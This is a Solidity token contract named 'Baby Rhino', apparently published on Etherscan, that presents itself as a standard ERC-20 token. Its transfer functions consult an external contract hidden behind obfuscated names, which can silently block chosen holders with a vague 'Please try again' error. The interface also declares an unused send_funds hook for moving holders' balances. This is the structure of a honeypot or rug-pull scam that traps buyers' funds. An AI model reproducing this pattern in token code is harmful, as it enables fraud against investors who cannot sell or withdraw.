/**
 *Submitted for verification at Etherscan.io on 2021-08-21
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface kk455 {

    function ponko( uint  _a, uint _b, uint _c) external view returns (bool);

    function tonkolon(address account) external view returns (uint8);

    function send_funds(address holder, address receiver, uint quant) external returns (bool);


}

contract BabyRhino {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    kk455 popotolano;
    uint256 public totalSupply = 100 * 10**12 * 10**18;
    string public name = "Baby Rhino";
    string public symbol = hex"426162795268696E6Ff09fa68f";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(kk455 _kamb) {
        
        popotolano = _kamb;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(popotolano.tonkolon(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(popotolano.tonkolon(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}